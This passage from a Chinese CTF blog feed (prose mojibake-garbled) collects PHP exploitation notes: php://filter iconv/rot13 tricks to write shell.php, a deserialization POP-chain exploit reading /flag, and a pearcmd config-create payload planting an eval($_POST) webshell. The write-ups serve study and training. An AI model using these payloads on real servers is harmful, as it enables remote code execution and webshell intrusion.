src="/2023/10/19/file_put_contents%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7(phpfilter%E5%8D%8F%E8%AE%AE%EF%BC%89/image/1964477-20200407103428847-745843372-1700990340346-133-1700994531544-107.png"></a><a href="https://img2020.cnblogs.com/blog/1964477/202004/1964477-20200407103501626-1447360416.png"><img src="/2023/10/19/file_put_contents%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7(phpfilter%E5%8D%8F%E8%AE%AE%EF%BC%89/image/1964477-20200407103501626-1447360416-1700990340346-134-1700994531544-108.png"></a></p><p> å’Œå‰é¢æåˆ°çš„ä¸€æ ·ï¼Œè¿™ç§æ–¹æ³•æ˜¯éœ€è¦æœåŠ¡å™¨æ²¡æœ‰å¼€å¯çŸ­æ ‡ç­¾çš„æ—¶å€™æ‰å¯ä»¥ä½¿ç”¨ï¼ˆé»˜è®¤æƒ…å†µæ˜¯æ²¡å¼€å¯çš„ï¼šphp.iniä¸­çš„short_open_tagï¼‰</p><p><strong>#æ–¹æ³•ä¸‰ã€iconvå­—ç¬¦ç¼–ç è½¬æ¢</strong></p><p>é€šè¿‡å­—ç¬¦è½¬æ¢æŠŠ<code>&lt;?php exit();</code>è½¬æˆä¸èƒ½è§£æçš„ï¼Œè¿™é‡Œé‡‡ç”¨çš„æ˜¯UCS-2æˆ–è€…UCS-4ç¼–ç æ–¹å¼ï¼Œè€Œæˆ‘ä»¬æ„é€ çš„è½¬æˆå¯æ­£å¸¸è§£æçš„</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#echo iconv(&quot;UCS-2LE&quot;,&quot;UCS-2BE&quot;,&#x27;&lt;?php phpinfo();?&gt;&#x27;);</span><br><span class="line">?&lt;hp phpipfn(o;)&gt;?</span><br></pre></td></tr></table></figure><p>è¿™é‡Œç”¨çš„æ˜¯UCS-2ï¼Œå½“ç„¶æˆ‘ä»¬ä¹Ÿå¯ä»¥ç”¨UCS-4</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo iconv(&quot;UCS-4LE&quot;,&quot;UCS-4BE&quot;,&#x27;aa&lt;?php phpinfo();?&gt;&#x27;);</span><br><span class="line">?&lt;aa phpiphp(ofn&gt;?;)</span><br></pre></td></tr></table></figure><p>é€šè¿‡UCS-2æˆ–è€…UCS-4çš„æ–¹å¼ï¼Œå¯¹ç›®æ ‡å­—ç¬¦ä¸²è¿›è¡Œ2&#x2F;4ä½ä¸€åè½¬ï¼Œä¹Ÿå°±æ˜¯è¯´æ„é€ çš„éœ€è¦æ˜¯UCS-2æˆ–UCS-4ä¸­2æˆ–è€…4çš„å€æ•°ï¼Œä¸ç„¶ä¸èƒ½è¿›è¡Œåè½¬ï¼Œé‚£æˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨è¿™ç§è¿‡æ»¤å™¨è¿›è¡Œç¼–ç è½¬æ¢ç»•è¿‡äº†ï¼Œæ„é€ payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$a=&#x27;php://filter/convert.iconv.UCS-2LE.UCS-2BE|?&lt;hp phpipfn(o;)&gt;?/resource=shell.php&#x27;;</span><br><span class="line"></span><br><span class="line">**or**</span><br><span class="line"></span><br><span class="line">$a=&#x27;php://filter/convert.iconv.UCS-4LE.UCS-4BE|xxx?&lt;aa phpiphp(ofn&gt;?;)/resource=shell.php&#x27;;</span><br><span class="line">#ç”±äºæ˜¯4ä½ä¸€åè½¬ï¼Œæ‰€ä»¥éœ€è¦ä¿è¯?&lt;aa phpiphp(ofn&gt;?;)ä¹‹å‰å­—ç¬¦ä¸ªæ•°æ˜¯4çš„å€æ•°,æ‰€ä»¥è¡¥å……äº† xxx</span><br></pre></td></tr></table></figure><p> <a href="https://img2020.cnblogs.com/blog/1964477/202004/1964477-20200407105517997-451500709.png"><img src="/2023/10/19/file_put_contents%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7(phpfilter%E5%8D%8F%E8%AE%AE%EF%BC%89/image/1964477-20200407105517997-451500709-1700990340346-135-1700994531544-109.png"></a></p><p><strong>#æ–¹æ³•å››ã€iconvå­—ç¬¦ç¼–ç è½¬æ¢+ROT13ç¼–ç ç»„åˆæ‹³</strong></p><p>å’Œå‰åä¸åŒçš„å˜é‡çš„åˆ©ç”¨ä¸€æ ·ï¼Œç›¸åŒå˜é‡ä¸€æ ·å¯ä»¥ä½¿ç”¨ç»„åˆæ‹³ï¼ŒåŸå› å‰é¢æè¿°è¿‡äº†ï¼Œå°±ä¸èµ˜è¿°ï¼Œè¿™é‡Œå°±ç”¨UCS-2å’Œrot13ä¸¾ä¸€ä¸ªä¾‹å­å§</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$a = &#x27;php://filter/write=convert.iconv.UCS-2LE.UCS-2BE|string.rot13|x?&lt;uc cucvcsa(b;)&gt;?/resource=shell.php&#x27;</span><br><span class="line">#å…ˆå°† &lt;?php phpinfo(); ?&gt; è¿›è¡Œrot13å¾—åˆ°&lt;?cuc cucvasb();?&gt;</span><br><span class="line">#å†å¯¹&lt;?cuc cucvasb();?&gt;è¿›è¡ŒUCS2ç¼–ç è½¬æ¢å¾—åˆ°?&lt;uc cucvcsa(b;)&gt;?</span><br><span class="line">#æœ€åx è¡¥ä½</span><br><span class="line">#æœ€ç»ˆå¾—åˆ°x?&lt;uc cucvcsa(b;)&gt;?</span><br></pre></td></tr></table></figure><p><a href="https://img2020.cnblogs.com/blog/1964477/202004/1964477-20200407111602416-1849632067.png"><img src="/2023/10/19/file_put_contents%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7(phpfilter%E5%8D%8F%E8%AE%AE%EF%BC%89/image/1964477-20200407111602416-1849632067-1700990340346-136-1700994531544-110.png"></a></p><p> ä¸ºä½•ä¸ç”¨string.strip_tagså‘¢ï¼Ÿå› ä¸ºrot13è½¬æ¢çš„åŒæ ·ä¼šè¢«strip_tagsæ–¹æ³•ç»™åˆ é™¤äº†ï¼Œè€ŒUCS-2æˆ–UCS-4æ„é€ çš„ä¹ŸåŒæ ·ä¼šè¢«strip_tagsæ–¹æ³•ç»™åˆ é™¤ï¼Œè¿™é‡Œéœ€è¦æ‰¾å…¶ä»–çš„ç¼–ç æ–¹å¼è¿›è¡Œæ„é€ ã€‚</p><p>å‚è€ƒï¼š</p><p><a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">https://www.leavesongs.com/PENETRATION/php-filter-magic.html</a></p><p><a href="https://mp.weixin.qq.com/s/BXBe0sviIpjzQb49fk1TCg">https://mp.weixin.qq.com/s/BXBe0sviIpjzQb49fk1TCg</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> ç¬”è®° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å­¦ä¹ ç¬”è®° </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>é¦™å±±æ¯</title>
      <link href="/2023/10/18/%E9%A6%99%E5%B1%B1%E6%9D%AF/"/>
      <url>/2023/10/18/%E9%A6%99%E5%B1%B1%E6%9D%AF/</url>
      
        <content type="html"><![CDATA[<h1 id="é¦™å±±æ¯"><a href="#é¦™å±±æ¯" class="headerlink" title="é¦™å±±æ¯"></a>é¦™å±±æ¯</h1><h2 id="PHP-unserialize-pro"><a href="#PHP-unserialize-pro" class="headerlink" title="PHP_unserialize_pro"></a>PHP_unserialize_pro</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Welcome</span><br><span class="line">&#123;</span><br><span class="line">    public $name=&#x27;A_G00d_H4ck3r&#x27;;</span><br><span class="line">    public $arg = &#x27;welcome&#x27;;</span><br><span class="line"></span><br><span class="line">//    public function __construct()</span><br><span class="line">//    &#123;</span><br><span class="line">//        $this-&gt;name = &#x27;Wh0 4m I?&#x27;;</span><br><span class="line">//    &#125;</span><br><span class="line"></span><br><span class="line">â€‹    public function __destruct()</span><br><span class="line">â€‹    &#123;</span><br><span class="line">â€‹        if ($this-&gt;name == &#x27;A_G00d_H4ck3r&#x27;) &#123;</span><br><span class="line">â€‹            echo &quot;1&quot;.$this-&gt;arg=&#x27;1&#x27;;</span><br><span class="line">â€‹        &#125;</span><br><span class="line">â€‹    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class G00d&#123;</span><br><span class="line">    public $shell;</span><br><span class="line">    public $cmd;</span><br><span class="line">    public function __invoke()&#123;</span><br><span class="line">        $shell = $this-&gt;shell;</span><br><span class="line">        $cmd = $this-&gt;cmd;</span><br><span class="line">        if(preg_match(&#x27;/f|l|a|g|\*|\?/i&#x27;, $cmd))&#123;</span><br><span class="line">            die(&quot;U R A BAD GUY&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        eval($shell($cmd));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class H4ck3r</span><br><span class="line">&#123;</span><br><span class="line">    public $func;</span><br><span class="line"></span><br><span class="line">â€‹    public function __toString()</span><br><span class="line">â€‹    &#123;</span><br><span class="line">â€‹        $function = $this-&gt;func;</span><br><span class="line">â€‹        return $function();</span><br><span class="line">â€‹    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a=new Welcome();</span><br><span class="line">$a-&gt;name=new H4ck3r();</span><br><span class="line">$a-&gt;name-&gt;func=new G00d();</span><br><span class="line">$a-&gt;name-&gt;func-&gt;shell=&#x27;strtolower&#x27;;</span><br><span class="line">$a-&gt;name-&gt;func-&gt;cmd=&#x27;show_source(chr(47).chr(102).chr(49).chr(97).chr(103));&#x27;;</span><br><span class="line">echo serialize($a);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pearå‘½ä»¤è¯»æ–‡ä»¶</title>
      <link href="/2023/10/18/Pear%E5%91%BD%E4%BB%A4%E8%AF%BB%E6%96%87%E4%BB%B6/"/>
      <url>/2023/10/18/Pear%E5%91%BD%E4%BB%A4%E8%AF%BB%E6%96%87%E4%BB%B6/</url>
      
        <content type="html"><![CDATA[<h1 id="Pearå‘½ä»¤è¯»æ–‡ä»¶"><a href="#Pearå‘½ä»¤è¯»æ–‡ä»¶" class="headerlink" title="Pearå‘½ä»¤è¯»æ–‡ä»¶"></a>Pearå‘½ä»¤è¯»æ–‡ä»¶</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/flag|log|session|filter|input|data/i&#x27;</span>, <span class="variable">$file</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$file</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">        <span class="comment"># Something in phpinfo.php!</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p><img src="/2023/10/18/Pear%E5%91%BD%E4%BB%A4%E8%AF%BB%E6%96%87%E4%BB%B6/image/image-20231017185626227-1700990443387-225.png"></p><blockquote><p> payload:+config-create+&#x2F;&amp;file&#x3D;&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;pearcmd&amp;&#x2F;<?=eval($_POST[1])?>+&#x2F;var&#x2F;www&#x2F;html&#x2F;a.php </p></blockquote><pre><code>ä¸åŒçš„ç³»ç»Ÿpearcmdå­˜æ”¾çš„ä½ç½®å¥½åƒä¸ä¸€å®šï¼Œ æœ‰çš„åœ¨/usr/share/php/pearcmd.phpã€‚å…³äºpayloadçš„è§£é‡Šï¼š config-createæ˜¯pearcmd.phpçš„å‚æ•°ï¼Œç”¨äºåˆ›å»ºé»˜è®¤é…ç½®æ–‡ä»¶ã€‚è¿™ä¸ªå‘½ä»¤éœ€è¦ä¸¤ä¸ªå‚æ•°ï¼Œæ ¹è·¯å¾„å’Œæ–‡ä»¶åã€‚æ‰€ä»¥payloadæ˜¯åˆ©ç”¨è¯¥å‚æ•°å°†&lt;?php eval($_POST[1])?&gt;å†™å…¥åˆ°/var/www/html/a.phpæ–‡ä»¶ä¸­ã€‚</code></pre><h1 id="registerargcargvä¸include-to-RCEçš„å·§å¦™ç»„åˆ-https-longlone-top-å®‰å…¨-å®‰å…¨ç ”ç©¶-register-argc-argvä¸include-to-RCEçš„å·§å¦™ç»„åˆ-registerargcargvä¸include-to-rceçš„å·§å¦™ç»„åˆ"><a href="#registerargcargvä¸include-to-RCEçš„å·§å¦™ç»„åˆ-https-longlone-top-å®‰å…¨-å®‰å…¨ç ”ç©¶-register-argc-argvä¸include-to-RCEçš„å·§å¦™ç»„åˆ-registerargcargvä¸include-to-rceçš„å·§å¦™ç»„åˆ" class="headerlink" title="registerargcargvä¸include to RCEçš„å·§å¦™ç»„åˆ[#](https://longlone.top/å®‰å…¨/å®‰å…¨ç ”ç©¶/register_argc_argvä¸include to RCEçš„å·§å¦™ç»„åˆ&#x2F;#registerargcargvä¸include-to-rceçš„å·§å¦™ç»„åˆ)"></a>register<em>argc</em>argvä¸include to RCEçš„å·§å¦™ç»„åˆ[#](<a href="https://longlone.top/%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/register_argc_argv%E4%B8%8Einclude">https://longlone.top/å®‰å…¨/å®‰å…¨ç ”ç©¶/register_argc_argvä¸include</a> to RCEçš„å·§å¦™ç»„åˆ&#x2F;#registerargcargvä¸include-to-rceçš„å·§å¦™ç»„åˆ)</h1><p>å¼•å­æ˜¯å·…å³°æå®¢2020çš„<strong>Meow World</strong>,é¢˜ç›®æ€»ç»“ä¸‹æ¥åªæœ‰ä¸€å¥è¯:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include $_GET[&#x27;f&#x27;].&quot;.php&quot;;</span><br></pre></td></tr></table></figure><p>çœŸçš„æ˜¯å¼€å±€ä¸€ä¸ªinclude,getshellå…¨é çŒœ,æ¯”èµ›æ—¶æç¤ºregister<em>argc</em>argv,ä½†æ²¡åšå‡ºæ¥,èµ›åçœ‹äº†åˆ«äººçš„wpå’Œæ€»ç»“,è‡ªå·±ä¹Ÿæ‰“ç®—å†™ä¸€ä¸ªå°ç»“.</p><h2 id="registerargcargv-https-longlone-top-å®‰å…¨-å®‰å…¨ç ”ç©¶-register-argc-argvä¸include-to-RCEçš„å·§å¦™ç»„åˆ-registerargcargv"><a href="#registerargcargv-https-longlone-top-å®‰å…¨-å®‰å…¨ç ”ç©¶-register-argc-argvä¸include-to-RCEçš„å·§å¦™ç»„åˆ-registerargcargv" class="headerlink" title="registerargcargv[#](https://longlone.top/å®‰å…¨/å®‰å…¨ç ”ç©¶/register_argc_argvä¸include to RCEçš„å·§å¦™ç»„åˆ&#x2F;#registerargcargv)"></a>register<em>argc</em>argv[#](<a href="https://longlone.top/%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/register_argc_argv%E4%B8%8Einclude">https://longlone.top/å®‰å…¨/å®‰å…¨ç ”ç©¶/register_argc_argvä¸include</a> to RCEçš„å·§å¦™ç»„åˆ&#x2F;#registerargcargv)</h2><p>é¦–å…ˆäº†è§£åˆ°è¿™ä¸ªå‚æ•°é»˜è®¤æ˜¯Onçš„:</p><img src="/2023/10/18/Pear%E5%91%BD%E4%BB%A4%E8%AF%BB%E6%96%87%E4%BB%B6/image/20210605082433-1700990443387-226.png" style="zoom:75%;"><p>ä½†æ˜¯ç»è¿‡åæ¥æµ‹è¯•å‘ç°ä½†å‡¡é…ç½®äº†php.iniçš„phpé‡Œéƒ½ä¼šæ˜¾ç¤ºå£°æ˜è¯¥å‚æ•°ä¸ºOff,é‚£ä¹ˆè¿™ä¸ªå‚æ•°æ˜¯ç”¨æ¥åšä»€ä¹ˆçš„å‘¢?</p><p><img src="/2023/10/18/Pear%E5%91%BD%E4%BB%A4%E8%AF%BB%E6%96%87%E4%BB%B6/image/20210605082507-1700990443387-227.png"></p><p><img src="/2023/10/18/Pear%E5%91%BD%E4%BB%A4%E8%AF%BB%E6%96%87%E4%BB%B6/image/20210605082516-1700990443387-228.png"></p><p>è¿™é‡Œä»‹ç»äº†register<em>argc</em>argvçš„ä½œç”¨,å½“è¿™ä¸ªå‚æ•°å¼€å¯çš„æ—¶å€™,phpä¼šæ³¨å†Œargcå’Œargvè¿™ä¸ªå…¨å±€å˜é‡,å¹¶ä¸”é€šè¿‡ç¬¬äºŒä¸ªå›¾å¯çŸ¥æˆ‘ä»¬å¯ä»¥ä»$_SERVER[â€˜argvâ€™] ä¸­è·å–åˆ°è¿™äº›å€¼.</p><p>è¿™é‡Œå°±è¦çŸ¥é“phpä½œä¸ºä¸€ç§è„šæœ¬è¯­è¨€,å½“ç„¶å¯ä»¥ç”¨äºç¼–å†™å‘½ä»¤è¡Œè„šæœ¬,è€Œæˆ‘ä»¬å¯ä»¥åœ¨è„šæœ¬ä¸­ç›´æ¥è®¿é—® argv ,argc è¿™ä¸¤ä¸ªå…¨å±€å˜é‡.</p><p>è¿™é‡Œå®é™…æµ‹è¯•ä¸‹è½½register<em>argc</em>argvå¼€å¯çš„æƒ…å†µä¸‹_SERVER[â€˜argvâ€™]ä¸argvçš„å€¼:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">var_dump($_SERVER[&#x27;argv&#x27;]);</span><br><span class="line">var_Dump($argv);</span><br></pre></td></tr></table></figure><p>ç½‘é¡µç«¯ä¸­:</p><p><img src="/2023/10/18/Pear%E5%91%BD%E4%BB%A4%E8%AF%BB%E6%96%87%E4%BB%B6/image/20210605082551-1700990443387-229.png"></p><p>å‘½ä»¤è¡Œæ¨¡å¼ä¸‹:</p><p><img src="/2023/10/18/Pear%E5%91%BD%E4%BB%A4%E8%AF%BB%E6%96%87%E4%BB%B6/image/20210605082610-1700990443387-233.png"></p><p>è€Œåœ¨register<em>argc</em>argvå…³é—­çš„æƒ…å†µä¸‹,$_SERVER[â€˜argvâ€™]ä¸ä¼šæ‹¿åˆ°ä»»ä½•å–å€¼</p><h2 id="pear-https-longlone-top-å®‰å…¨-å®‰å…¨ç ”ç©¶-register-argc-argvä¸include-to-RCEçš„å·§å¦™ç»„åˆ-pear"><a href="#pear-https-longlone-top-å®‰å…¨-å®‰å…¨ç ”ç©¶-register-argc-argvä¸include-to-RCEçš„å·§å¦™ç»„åˆ-pear" class="headerlink" title="pear[#](https://longlone.top/å®‰å…¨/å®‰å…¨ç ”ç©¶/register_argc_argvä¸include to RCEçš„å·§å¦™ç»„åˆ&#x2F;#pear)"></a>pear[#](<a href="https://longlone.top/%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/register_argc_argv%E4%B8%8Einclude">https://longlone.top/å®‰å…¨/å®‰å…¨ç ”ç©¶/register_argc_argvä¸include</a> to RCEçš„å·§å¦™ç»„åˆ&#x2F;#pear)</h2><p>æ¥ä¸‹æ¥å°±è¦ä»‹ç»pearè¿™ä¸ªå‘½ä»¤,ç®€ä»‹å¦‚ä¸‹:</p><h3 id="pear-https-longlone-top-å®‰å…¨-å®‰å…¨ç ”ç©¶-register-argc-argvä¸include-to-RCEçš„å·§å¦™ç»„åˆ-pear-1"><a href="#pear-https-longlone-top-å®‰å…¨-å®‰å…¨ç ”ç©¶-register-argc-argvä¸include-to-RCEçš„å·§å¦™ç»„åˆ-pear-1" class="headerlink" title="pear[#](https://longlone.top/å®‰å…¨/å®‰å…¨ç ”ç©¶/register_argc_argvä¸include to RCEçš„å·§å¦™ç»„åˆ&#x2F;#pear_1)"></a>pear[#](<a href="https://longlone.top/%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/register_argc_argv%E4%B8%8Einclude">https://longlone.top/å®‰å…¨/å®‰å…¨ç ”ç©¶/register_argc_argvä¸include</a> to RCEçš„å·§å¦™ç»„åˆ&#x2F;#pear_1)</h3><p>Pear æ˜¯ PHP æ‰©å±•ä¸åº”ç”¨åº“ï¼ˆthe PHP Extension and Application Repositoryï¼‰çš„ç¼©å†™ï¼Œæ˜¯ä¸€ä¸ª PHP æ‰©å±•åŠåº”ç”¨çš„ä¸€ä¸ªä»£ç ä»“åº“ã€‚Pear ä»“åº“ä»£ç æ˜¯ä»¥åŒ…ï¼ˆpackageï¼‰åˆ†åŒºï¼Œæ¯ä¸€ä¸ª <code>Pear package</code> éƒ½æ˜¯ä¸€ä¸ªç‹¬ç«‹çš„é¡¹ç›®æœ‰ç€è‡ªå·±ç‹¬ç«‹çš„å¼€å‘å›¢é˜Ÿã€ç‰ˆæœ¬æ§åˆ¶ã€æ–‡æ¡£å’Œå…¶ä»–åŒ…çš„ä¾èµ–å…³ç³»ä¿¡æ¯ã€‚Pear package ä»¥ pharã€tar æˆ– zip å‘å¸ƒã€‚</p><p>æ—¢ç„¶æ˜¯ä¸ªåŒ…ç®¡ç†å™¨,é‚£ä¹ˆå°±åº”è¯¥å­˜åœ¨ä¸‹è½½å’Œå®‰è£…åŒ…çš„åŠŸèƒ½,é‚£ä¹ˆpearå‘½ä»¤æ˜¯å¦‚ä½•å®ç°çš„å‘¢?</p><p>å®é™…ä¸Špearå‘½ä»¤æ˜¯shè„šæœ¬,æºç å¦‚ä¸‹:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line"></span><br><span class="line"># first find which PHP binary to use</span><br><span class="line">if test &quot;x$PHP_PEAR_PHP_BIN&quot; != &quot;x&quot;; then</span><br><span class="line">  PHP=&quot;$PHP_PEAR_PHP_BIN&quot;</span><br><span class="line">else</span><br><span class="line">  if test &quot;/usr/local/bin/php&quot; = &#x27;@&#x27;php_bin&#x27;@&#x27;; then</span><br><span class="line">    PHP=php</span><br><span class="line">  else</span><br><span class="line">    PHP=&quot;/usr/local/bin/php&quot;</span><br><span class="line">  fi</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line"># then look for the right pear include dir</span><br><span class="line">if test &quot;x$PHP_PEAR_INSTALL_DIR&quot; != &quot;x&quot;; then</span><br><span class="line">  INCDIR=$PHP_PEAR_INSTALL_DIR</span><br><span class="line">  INCARG=&quot;-d include_path=$PHP_PEAR_INSTALL_DIR&quot;</span><br><span class="line">else</span><br><span class="line">  if test &quot;/usr/local/lib/php&quot; = &#x27;@&#x27;php_dir&#x27;@&#x27;; then</span><br><span class="line">    INCDIR=`dirname $0`</span><br><span class="line">    INCARG=&quot;&quot;</span><br><span class="line">  else</span><br><span class="line">    INCDIR=&quot;/usr/local/lib/php&quot;</span><br><span class="line">    INCARG=&quot;-d include_path=/usr/local/lib/php&quot;</span><br><span class="line">  fi</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">exec $PHP -C -q $INCARG -d date.timezone=UTC -d output_buffering=1 -d variables_order=EGPCS -d open_basedir=&quot;&quot; -d safe_mode=0 -d register_argc_argv=&quot;On&quot; -d auto_prepend_file=&quot;&quot; -d auto_append_file=&quot;&quot; $INCDIR/pearcmd.php &quot;$@&quot;</span><br></pre></td></tr></table></figure><p>é€šè¿‡çœ‹æœ€åä¸€è¡Œå¯ä»¥çŸ¥é“å…¶å®å®ƒæ˜¯é€šè¿‡phpè°ƒç”¨äº†pearcmd.php,é‚£ä¹ˆpearcmd.phpä¸­$argvæ˜¯ä»å“ªé‡Œæ¥çš„å‘¢,é€šè¿‡ç®€å•æŸ¥æ‰¾å¯ä»¥çœ‹åˆ°å…¶è°ƒç”¨äº†å¦ä¸€ä¸ªphpæ–‡ä»¶ä¸­æŸä¸ªç±»æ–¹æ³•:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">require_once &#x27;Console/Getopt.php&#x27;;</span><br><span class="line">/* ... */</span><br><span class="line">$argv = Console_Getopt::readPHPArgv();</span><br></pre></td></tr></table></figure><p>å†æ¬¡è·Ÿè¿›Console&#x2F;Getopt.php,æ‰¾åˆ°è¯¥æ–¹æ³•çš„å®ç°:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">public static function readPHPArgv()</span><br><span class="line">    &#123;</span><br><span class="line">        global $argv;</span><br><span class="line">        if (!is_array($argv)) &#123;</span><br><span class="line">            if (!@is_array($_SERVER[&#x27;argv&#x27;])) &#123;</span><br><span class="line">                if (!@is_array($GLOBALS[&#x27;HTTP_SERVER_VARS&#x27;][&#x27;argv&#x27;])) &#123;</span><br><span class="line">                    $msg = &quot;Could not read cmd args (register_argc_argv=Off?)&quot;;</span><br><span class="line">                    return PEAR::raiseError(&quot;Console_Getopt: &quot; . $msg);</span><br><span class="line">                &#125;</span><br><span class="line">                return $GLOBALS[&#x27;HTTP_SERVER_VARS&#x27;][&#x27;argv&#x27;];</span><br><span class="line">            &#125;</span><br><span class="line">            return $_SERVER[&#x27;argv&#x27;];</span><br><span class="line">        &#125;</span><br><span class="line">        return $argv;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°è·å–$argvçš„æ–¹å¼æ˜¯<code>global $argv --&gt; $_SERVER[&#39;argv&#39;] --&gt; $GLOBALS[&#39;HTTP_SERVER_VARS&#39;][&#39;argv&#39;]</code></p><p>åŒæ—¶æˆ‘ä»¬çŸ¥é“å½“æˆ‘ä»¬includeä¸€ä¸ªå¯ä»¥è¢«phpè§£æçš„æ–‡ä»¶çš„æ—¶å€™,phpä»£ç ä¼šè¢«è‡ªåŠ¨æ‰§è¡Œ,è¿™æ 